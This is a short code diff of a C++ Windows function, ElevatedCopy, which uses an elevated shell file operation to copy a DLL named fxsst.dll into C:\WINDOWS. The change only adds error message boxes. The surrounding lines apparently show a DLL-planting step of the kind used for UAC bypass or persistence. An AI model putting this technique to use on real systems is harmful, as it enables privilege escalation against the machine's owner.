@@ -126,11 +126,13 @@ void ElevatedCopy()
     hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     pfo->CopyItem(from, to, L"fxsst.dll", NULL);
